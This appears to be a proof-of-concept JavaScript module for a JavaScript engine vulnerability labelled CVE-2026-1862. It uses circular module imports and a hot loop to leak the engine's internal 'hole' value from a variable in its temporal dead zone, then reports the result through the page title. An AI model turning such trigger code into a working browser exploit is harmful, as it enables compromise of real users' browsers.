// Circular import approach for CVE-2026-1862
// This module imports from circ_b, which imports our x
// When circ_b evaluates, our x is in TDZ

import { readX, warmAndLeak } from './cve1862_circ_b.mjs';

// x is still in TDZ here when circ_b evaluated!
// But now both modules have finished evaluation...
// We need circ_b to have leaked during ITS evaluation

export let x = 42;

// circ_b should have already attempted the leak during its evaluation
// Let's also try post-evaluation leak with a different variable
export let y; // Will init later

function leakY() {
  for (let i = 0; i < 5000000; i++) {
    if (i === 4999999) {
      return y;
    }
  }
}

let holed = leakY();
y = 99;

let isHole = (typeof holed === "undefined" && holed !== undefined);

// Get circ_b's result too
let bResult = warmAndLeak();

let results = {
  selfLeak: {
    type: typeof holed,
    isUndef: holed === undefined,
    isHole: isHole,
  },
  circLeak: bResult
};

if (typeof document !== 'undefined') {
  document.title = "CIRC:" + JSON.stringify(results);
}
